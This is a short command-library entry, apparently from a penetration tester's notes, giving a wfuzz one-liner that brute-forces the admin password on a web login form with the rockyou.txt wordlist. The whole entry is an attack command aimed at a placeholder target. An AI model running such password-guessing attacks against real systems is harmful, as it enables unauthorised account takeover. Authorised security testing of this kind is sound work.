---
id: 1992842f-23f2-4650-8ab0-18c9059a99f4
name: bruteforce post data (login)
type: command
executor: bash
data: 'wfuzz -u http://target-ip/path/index.php?action=authenticate -d ''username=admin&password=FUZZ''
  -w /usr/share/wordlists/rockyou.txt

  '
output: null
created_at: '2020-07-14T18:15:01.552609+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# bruteforce post data (login)

```bash
wfuzz -u http://target-ip/path/index.php?action=authenticate -d 'username=admin&password=FUZZ' -w /usr/share/wordlists/rockyou.txt

```
